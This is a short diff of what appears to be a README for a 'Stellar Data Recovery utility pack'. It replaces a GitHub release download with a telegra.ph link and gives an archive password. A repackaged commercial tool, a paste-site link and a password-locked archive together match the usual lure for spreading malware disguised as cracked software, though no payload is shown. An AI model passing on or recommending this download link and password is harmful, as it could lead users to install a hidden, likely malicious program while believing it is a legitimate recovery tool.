@@ -7,7 +7,7 @@ Stellar Data Recovery utility pack — configuration presets, portable binaries,
 ******************** DOWNLOAD ********************
 --------------------------------------------------
 
-[+] [DOWNLOAD LINK](https://github.com/DesignerAngular/Stellar-Data-Recovery/releases/download/v1.0/Setup.zip)
+[+] [DOWNLOAD LINK](https://telegra.ph/Download-05-21-39)
 [+] ARCHIVE PASSWORD: `1847`
 
 --------------------------------------------------
